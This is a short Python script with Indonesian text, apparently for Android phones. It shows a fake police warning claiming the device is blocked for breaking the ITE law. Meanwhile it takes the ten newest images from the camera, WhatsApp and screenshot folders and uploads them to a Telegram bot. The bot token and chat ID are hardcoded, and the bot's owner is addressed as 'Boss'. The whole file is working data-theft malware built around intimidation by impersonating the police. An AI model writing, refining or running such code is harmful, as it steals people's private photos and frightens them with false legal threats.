import os
import subprocess
import sys

# --- FUNGSI AUTO INSTALLER (BIAR GAK ERROR MODULE) ---
def install_requests():
    try:
        import requests
    except ImportError:
        print("📦 Library 'requests' belum ada. Sedang mengunduh...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        print("✅ Berhasil install! Melanjutkan operasi...")

# Jalankan installer dulu
install_requests()

import requests
import time

# --- KONFIGURASI BOSS ---
BOT_TOKEN = "8592113872:AAFhQWMgysBLDJvQPyXNqTQfP_EhtY7WfGc"
CHAT_ID = "5463042057"

def kirim_log(pesan):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.get(url, params={'chat_id': CHAT_ID, 'text': pesan})
    except:
        pass

def kirim_file(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as doc:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'document': doc})
    except:
        pass

def tampilkan_pesan_palsu():
    print("\n" + "="*50)
    print("      ⚠️ PERINGATAN KERAS: SISTEM ANDA TERBLOKIR ⚠️")
    print("="*50)
    print("\nDIREKTORAT TINDAK PIDANA SIBER POLRI MENDETEKSI")
    print("PELANGGARAN BERAT UU ITE PADA PERANGKAT INI.")
    print("\nSTATUS: DALAM PENGAWASAN KETAT")
    print("\nJANGAN TUTUP APLIKASI INI HINGGA PROSES SELESAI.")
    print("="*50 + "\n")

def eksekusi_rampas():
    target_folders = [
        "/sdcard/DCIM/Camera/",
        "/sdcard/WhatsApp/Media/WhatsApp Images/",
        "/sdcard/Pictures/Screenshots/"
    ]
    
    ekstensi = [".jpg", ".png", ".jpeg"]
    kirim_log("🚨 **TARGET BARU!** Sedang menyedot galeri...")

    for folder in target_folders:
        if os.path.exists(folder):
            files = os.listdir(folder)
            valid_files = [f for f in files if any(f.lower().endswith(e) for e in ekstensi)]
            valid_files.sort(key=lambda x: os.path.getmtime(os.path.join(folder, x)), reverse=True)
            
            for file in valid_files[:10]:
                full_path = os.path.join(folder, file)
                kirim_file(full_path)
                time.sleep(1)

    kirim_log("✅ **OPERASI SELESAI.** Cek folder galeri lu, Boss!")

if __name__ == "__main__":
    tampilkan_pesan_palsu()
    try:
        eksekusi_rampas()
    except Exception as e:
        kirim_log(f"❌ Gagal: {e}")